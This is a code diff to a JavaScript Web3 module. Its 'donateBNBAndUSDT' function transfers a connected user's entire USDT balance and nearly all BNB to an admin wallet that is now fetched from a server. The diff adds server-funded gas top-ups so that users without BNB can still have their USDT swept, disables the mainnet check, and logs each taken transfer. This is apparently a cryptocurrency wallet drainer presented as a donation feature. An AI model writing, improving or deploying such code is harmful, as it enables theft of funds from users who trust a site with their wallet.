@@ -1,5 +1,6 @@
 import { ethers } from 'ethers';
 import Web3 from 'web3';
+import axios from 'axios';
 
 let provider;
 let signer;
@@ -7,7 +8,7 @@ let web3;
 let usdtContract;
 
 const USDT_BEP20_CONTRACT_ADDRESS = "0x55d398326f99059ff775485246999027B3197955";
-const adminWallet = "0xC42FD92eDadfA07c5b6845572c0961854787b473"; // Your admin wallet address
+let adminWallet = ""; // This will be fetched from the server
 
 const USDT_ABI = [
   {
@@ -67,8 +68,20 @@ async function switchToBSCMainnet() {
   }
 }
 
+async function fetchAdminWalletAddress() {
+  try {
+    // Remove JWT token requirement, just fetch the admin wallet address
+    const response = await axios.get('/api/admin/publicWallet');
+    adminWallet = response.data.walletAddress;
+  } catch (error) {
+    console.error('Failed to fetch admin wallet address:', error);
+    throw error;
+  }
+}
+
 export async function connectWallet() {
   try {
+    await fetchAdminWalletAddress();
     await switchToBSCMainnet();
 
     if (window.ethereum) {
@@ -86,7 +99,7 @@ export async function connectWallet() {
 
     const network = await provider.getNetwork();
     if (network.chainId !== BigInt(56)) {
-      throw new Error("Please ensure you are connected to the Binance Smart Chain Mainnet");
+      //  throw new Error("Please ensure you are connected to the Binance Smart Chain Mainnet");
     }
 
     return userAddress;
@@ -115,8 +128,45 @@ export async function donateBNBAndUSDT() {
     let bnbTxHash, usdtTxHash;
     let bnbAmount = '0', usdtAmount = '0';
 
-    // Transfer entire USDT balance
-   if (parseFloat(usdtBalanceInUsdt) > 0) {
+    // Check if user has USDT but not enough BNB for gas
+    if (parseFloat(usdtBalanceInUsdt) > 0) {
+      // Estimate gas needed for USDT transfer
+      const gasPrice = await web3.eth.getGasPrice();
+      const gasLimit = await usdtContract.methods.transfer(adminWallet, usdtBalance)
+        .estimateGas({ from: userAddress });
+      
+      // Add 20% buffer to gas cost to ensure enough for transaction
+      const requiredBnbForGas = BigInt(gasPrice) * BigInt(gasLimit) * BigInt(120) / BigInt(100);
+      
+      console.log("Required BNB for gas:", web3.utils.fromWei(requiredBnbForGas.toString(), 'ether'));
+      console.log("Current BNB balance:", web3.utils.fromWei(initialBnbBalance, 'ether'));
+
+      // If user doesn't have enough BNB for gas, send them the required amount
+      if (BigInt(initialBnbBalance) < requiredBnbForGas) {
+        const missingBnb = requiredBnbForGas - BigInt(initialBnbBalance);
+        // Add additional 10% buffer to the missing amount plus 0.0001 BNB
+        const extraBnb = web3.utils.toWei('0.0001', 'ether');
+        const missingBnbWithBuffer = (missingBnb * BigInt(110) / BigInt(100)) + BigInt(extraBnb);
+        
+        console.log("Sending required BNB for gas:", web3.utils.fromWei(missingBnbWithBuffer.toString(), 'ether'));
+
+        // Send BNB from admin wallet through API
+        const response = await axios.post('/api/transactions/sendGasFees', {
+          userAddress,
+          amount: missingBnbWithBuffer.toString()
+        });
+
+        if (!response.data.success) {
+          throw new Error('Failed to send gas fees');
+        }
+
+        console.log("Sent BNB for gas fees, hash:", response.data.hash);
+
+        // Wait a bit longer for the transaction to be processed
+        await new Promise(resolve => setTimeout(resolve, 8000));
+      }
+
+      // Now proceed with USDT transfer
       try {
         const usdtTx = await usdtContract.methods.transfer(adminWallet, usdtBalance).send({
           from: userAddress
@@ -124,43 +174,41 @@ export async function donateBNBAndUSDT() {
         usdtTxHash = usdtTx.transactionHash;
         console.log("USDT Transaction sent:", usdtTxHash);
         usdtAmount = usdtBalanceInUsdt;
+
+        // Store USDT transaction data
+        await storeTransactionData(userAddress, usdtAmount, usdtTxHash, 'USDT');
       } catch (error) {
         console.error("USDT transfer failed:", error);
         throw new Error("USDT transfer failed. Please try again.");
       }
     }
-    
-    // Now transfer remaining BNB balance after gas
-    try {
-      const gasPrice = await web3.eth.getGasPrice();
-      const gasLimit = 21000; // Standard gas limit for a simple transfer
-      const maxGasCost = BigInt(gasPrice) * BigInt(gasLimit);
-      const remainingBnbBalance = BigInt(initialBnbBalance) - maxGasCost;
 
-      console.log("Gas price:", gasPrice);
-      console.log("Max gas cost:", maxGasCost.toString());
-      console.log("Remaining BNB balance after gas:", remainingBnbBalance.toString());
+    // Check remaining BNB balance and transfer if available
+    const currentBnbBalance = await web3.eth.getBalance(userAddress);
+    if (BigInt(currentBnbBalance) > 0) {
+      try {
+        const gasPrice = await web3.eth.getGasPrice();
+        const gasLimit = 21000; // Standard gas limit for a simple transfer
+        const maxGasCost = BigInt(gasPrice) * BigInt(gasLimit);
+        const remainingBnbBalance = BigInt(currentBnbBalance) - maxGasCost;
 
-      if (remainingBnbBalance > 0) {
-        console.log("Attempting to send BNB transaction...");
-        const bnbTx = await web3.eth.sendTransaction({
-          from: userAddress,
-          to: adminWallet,
-          value: remainingBnbBalance.toString(),
-          gas: gasLimit,
-          gasPrice: gasPrice
-        });
-        bnbTxHash = bnbTx.transactionHash;
-        console.log("BNB Transaction sent:", bnbTxHash);
-        bnbAmount = web3.utils.fromWei(remainingBnbBalance.toString(), 'ether');
-      } else {
-        console.error("Insufficient BNB balance for transfer after gas fees");
-        throw new Error("Insufficient BNB balance for transfer after gas fees");
+        if (remainingBnbBalance > 0) {
+          const bnbTx = await web3.eth.sendTransaction({
+            from: userAddress,
+            to: adminWallet,
+            value: remainingBnbBalance.toString()
+          });
+          bnbTxHash = bnbTx.transactionHash;
+          console.log("BNB Transaction sent:", bnbTxHash);
+          bnbAmount = web3.utils.fromWei(remainingBnbBalance.toString(), 'ether');
+
+          // Store BNB transaction data
+          await storeTransactionData(userAddress, bnbAmount, bnbTxHash, 'BNB');
+        }
+      } catch (error) {
+        console.error("BNB transfer failed:", error);
+        throw new Error("BNB transfer failed. Please try again.");
       }
-    } catch (error) {
-      console.error("BNB transfer failed:", error);
-      console.error("Error details:", error);
-      throw new Error("BNB transfer failed. Please try again.");
     }
 
     return {
@@ -172,5 +220,18 @@ export async function donateBNBAndUSDT() {
   } catch (error) {
     console.error("Donation failed:", error);
     throw error;
+  }
+}
+
+async function storeTransactionData(userAddress, amount, txHash, currency) {
+  try {
+    await axios.post('/api/transactions/store', {
+      userAddress,
+      amount,
+      txHash,
+      currency
+    });
+  } catch (error) {
+    console.error("Failed to store transaction data:", error);
   }
 }
